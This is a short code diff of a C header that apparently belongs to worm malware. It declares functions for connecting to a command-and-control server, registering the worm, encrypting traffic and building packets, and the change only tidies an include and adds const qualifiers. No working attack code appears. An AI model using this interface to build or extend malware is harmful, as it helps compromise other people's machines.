@@ -6,7 +6,6 @@
 #define NETWORKING_API __declspec(dllimport)
 #endif
 
-#include <WinSock2.h>
 
 /* Function to initialize sockets and connect C2 server */
 SOCKET connect_to_c2(char *,  char *);
@@ -21,7 +20,7 @@ char *encryption(char *);
 char *decryption(char *);
 
 /* Create packet structure */
-char *structure_init_message(char, char*, char *, char *, char *);
+char *structure_init_message(char, const char*, const char *, const char *, const char *);
 
 /* main driver function for first traffic comms to C2 */
 int register_worm(char, char *, char *, char *, char *);
